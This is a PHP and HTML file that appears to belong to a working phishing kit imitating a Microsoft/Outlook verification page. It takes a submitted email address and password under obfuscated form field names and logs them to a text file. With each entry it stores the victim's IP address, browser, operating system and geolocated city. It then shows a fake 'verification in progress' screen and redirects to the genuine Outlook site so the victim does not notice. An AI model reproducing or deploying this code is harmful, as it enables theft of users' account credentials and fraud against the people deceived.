<?php
include('archivo.php');
@$userp = $_SERVER['REMOTE_ADDR'];



////////////////////
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No hemos podido detectar su navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);

$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
$pais = $meta['geoplugin_countryName']; 
$region = $meta['geoplugin_regionName'];
$ciudad = $meta['geoplugin_city'];
date_default_timezone_set('America/Caracas');


////////////////////

if(isset ($_POST['lgdmdp']) && isset ($_POST['djddhd']) ){

	$file = fopen("".$nombre_archivo.".txt", "a");

fwrite($file, "eml : " .$_POST['lgdmdp']. PHP_EOL);
fwrite($file, "clave eml : " .$_POST['djddhd']. PHP_EOL);
fwrite($file, date ('l jS \of F Y h:i:s A',time()));
fwrite($file, "SO= ".$user_os.", Nave= ".$navegador. PHP_EOL);
fwrite($file, "IP= ".$userp. PHP_EOL);
fwrite($file, "Ubicacion= ".$pais.", ".$region.", ".$ciudad. PHP_EOL);
fwrite($file, "=============================" . PHP_EOL);
@header ('refresh:5;url=https://outlook.live.com/owa/');

}else{ header ('location: index.html'); exit(); }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">

 <title>Verificación Microsoft</title>

 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">

 
 <link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" 
 href="./index_files/Converged_v23082_aaRUc92kCx1I0HSCbabz7g2.css">


<style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>
</head>

<body class="cb"><div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form name="f1"  method="post"  action="complete.php">

    <div ><!--  -->

        <div id="lightboxTemplateContainer"><!--  -->

<div id="lightboxBackgroundContainer">
<div class="background-image-holder" role="presentation">
 
    <div  class="background-image ext-background-image" 
	style="background-image: url(&quot;index_files/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>

</div></div>

<div class="outer">
    
    <div class="template-section main-section">
        <div class="middle ext-middle">
            <div class="full-height" >


<div class="flex-column">


    <div class="win-scroll">

<div alig="center">
    <h3>Verificación en proceso</h3>
	<img src="index_files/loading-buffering.gif">
</div>
       
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>


    <div  role="contentinfo"  class="footer ext-footer">

        <div>
<div class="footerNode text-secondary">

   
        <a href="index.html" class="footer-content ext-footer-content footer-item ext-footer-item"></a>
        <!-- /ko -->


        <a  href="index.html" class="footer-content ext-footer-content footer-item ext-footer-item"></a>

    <a href="index.html" role="button" 
	class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.CX && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>

    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>




<!-- /ko --></div>

</body>
</html>